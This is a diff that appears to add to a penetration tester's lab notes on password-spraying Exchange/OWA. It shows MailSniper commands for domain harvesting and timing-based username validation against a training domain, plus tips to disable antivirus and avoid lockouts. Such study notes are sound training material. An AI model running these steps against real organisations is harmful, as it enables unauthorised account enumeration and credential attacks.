@@ -38,3 +38,39 @@ bob.farmer
 farmer.bob
 farmerb
 ```
+
+> [!hint] 
+> We could potentially skip this step if we knew the email address format from somewhere like hunter.io 
+
+Two excellent tools for password spraying against Office 365 and Exchange are [MailSniper](https://github.com/dafthack/MailSniper) and [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit). import MailSniper.ps1. (Disable AV first)
+
+```
+PS C:\Users\Attacker> ipmo C:\Tools\MailSniper\MailSniper.ps1
+```
+
+
+Enumerate the NetBIOS name of the target domain with `Invoke-DomainHarvestOWA`.
+
+```
+PS C:\Users\Attacker> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
+```
+
+Get the netbios name with:
+
+```
+Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
+```
+
+
+`Invoke-UsernameHarvestOWA` uses a timing attack to validate which (if any) of these usernames are valid.
+ 
+```
+Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
+```
+ 
+ > [!OPSEC]
+ > In the real world, be aware that these authentication attempts may count towards the domain lockout policy for the users.  Too many attempts in a short space of time are not only loud but may also lock accounts out.
+>  
+ 
+ 
+
